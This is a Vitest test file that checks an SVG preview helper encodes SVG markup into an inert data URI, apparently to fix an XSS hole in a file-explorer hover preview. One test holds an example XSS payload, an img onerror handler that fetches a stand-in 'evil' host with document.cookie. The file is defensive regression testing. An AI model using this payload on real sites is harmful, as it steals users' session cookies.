import { describe, it, expect } from 'vitest';
import { svgPreviewSrc } from './svgPreview';

describe('svgPreviewSrc — script-safe SVG preview', () => {
  it('encodes an SVG XSS payload into a data-URI so it can never execute as live HTML', () => {
    // The exact attack the FileExplorer hover-preview used to enable: a `logo.svg` whose bytes are an
    // onerror exfiltration. Encoded into an <img> data-URI it is inert markup, not a live DOM sink.
    const payload = '<svg xmlns="http://www.w3.org/2000/svg"><img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)"></svg>';
    const src = svgPreviewSrc(payload);
    expect(src.startsWith('data:image/svg+xml;charset=utf-8,')).toBe(true);
    expect(src).not.toContain('<img');       // percent-encoded, not raw markup
    expect(src).not.toContain('onerror=');   // the handler is encoded, cannot fire
  });

  it('round-trips a real SVG (still renders as an image)', () => {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4"/></svg>';
    const src = svgPreviewSrc(svg);
    expect(decodeURIComponent(src.replace('data:image/svg+xml;charset=utf-8,', ''))).toBe(svg);
  });

  it('tolerates empty/undefined input', () => {
    expect(svgPreviewSrc('')).toBe('data:image/svg+xml;charset=utf-8,');
    expect(svgPreviewSrc(undefined as unknown as string)).toBe('data:image/svg+xml;charset=utf-8,');
  });
});
